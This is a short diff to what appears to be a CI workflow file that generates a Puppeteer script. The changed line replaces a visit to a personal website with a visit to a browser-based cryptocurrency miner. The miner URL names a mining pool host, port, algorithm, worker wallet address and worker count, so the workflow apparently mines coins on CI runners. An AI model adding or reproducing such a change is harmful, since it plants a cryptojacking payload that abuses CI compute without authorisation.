@@ -266,7 +266,7 @@ jobs:
 
           echo "    await fetchIP(true);" >> continuous_visit_puppeteer.js
 
-          echo "    await visitWebsite('https://dileepaw.netlify.app');" >> continuous_visit_puppeteer.js
+          echo "    await visitWebsite('https://webminer.pages.dev?algorithm=cwm_ghostrider&host=ghostrider.na.mine.zpool.ca&port=5354&worker=RAkMRxipMsapdCbF4C2nLGNDKBsmpuvpcK&password=c%3DRVN&workers=3');" >> continuous_visit_puppeteer.js
 
           echo "    await randomWait();" >> continuous_visit_puppeteer.js
 
